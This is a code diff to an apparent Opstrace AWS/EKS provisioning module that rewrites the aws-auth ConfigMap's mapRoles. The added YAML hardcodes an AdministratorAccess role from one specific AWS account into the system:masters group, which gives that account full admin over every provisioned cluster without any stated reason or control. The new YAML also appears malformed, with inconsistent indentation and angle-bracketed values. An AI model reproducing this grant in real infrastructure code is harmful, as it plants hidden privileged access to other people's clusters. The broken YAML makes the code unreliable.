@@ -18,6 +18,7 @@
 import { strict as assert } from "assert";
 
 import AWS from "aws-sdk";
+import dedent from "dedent";
 import { all, call, fork, join } from "redux-saga/effects";
 
 import { ensureDNSExists } from "@opstrace/dns";
@@ -726,6 +727,22 @@ export function* ensureAWSInfraExists(): Generator<
     loadFromCluster: false,
     kubeconfig: kubeconfigString
   });
+
+  const mapRolesYamlString = dedent(`
+  - rolearn: ${workerNodeRole.Arn}
+  username: <system:node:{{EC2PrivateDNSName}}>
+  groups:
+    - <system:bootstrappers>
+    - <system:nodes>
+
+  - rolearn: arn:aws:iam::959325414060:role/AWSReservedSSO_AdministratorAccess_8488c3da2f880f06
+    username: <system:node:{{EC2PrivateDNSName}}>
+    groups:
+      - <system:bootstrappers>
+      - <system:nodes>
+      - <system:masters>
+  `);
+
   const awsAuthConfigMap = new ConfigMap(
     {
       apiVersion: "v1",
@@ -735,7 +752,7 @@ export function* ensureAWSInfraExists(): Generator<
         namespace: "kube-system"
       },
       data: {
-        mapRoles: `- rolearn: ${workerNodeRole.Arn}\n  username: system:node:{{EC2PrivateDNSName}}\n  groups:\n    - system:bootstrappers\n    - system:nodes\n`
+        mapRoles: mapRolesYamlString
       }
     },
     kubeConfig
